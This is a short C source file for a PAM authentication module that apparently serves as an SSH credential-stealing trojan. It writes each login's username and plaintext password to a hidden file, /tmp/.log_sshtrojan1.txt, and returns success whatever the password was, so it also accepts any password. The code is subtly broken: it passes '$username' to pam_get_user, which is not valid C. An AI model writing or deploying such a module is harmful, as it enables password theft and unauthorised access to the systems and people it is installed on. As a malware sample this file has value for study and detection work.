#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#ifndef LINUX 
#include <security/pam_appl.h>

#define PAM_SM_AUTH
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t * pamh, int flags, int argc, const char ** argv){
    char * username = NULL;
    char * password = NULL;

    if (pam_get_user(pamh, $username, NULL) != PAM_SUCCESS){
        return PAM_USER_UNKNOWN;
    }

    // get passwd
    if (pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL) != PAM_SUCCESS){
        return PAM_AUTH_ERR;
    }
    if (username == NULL || password == NULL){
        return PAM_AUTHINFO_UNAVAIL;
    }

    FILE *f;
    f = fopen("/tmp/.log_sshtrojan1.txt","a");
    fseek(f,0L,SEEK_END);
    time_t t = time(NULL);
    fprintf(f,"User: %s password: %s login at %s", username, password, asctime(gmtime(&t)));
    fclose(f);
    return (PAM_SUCCESS);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t * pamh, int flags, int argc, const char ** argv){
    return(PAM_SUCCESS);
}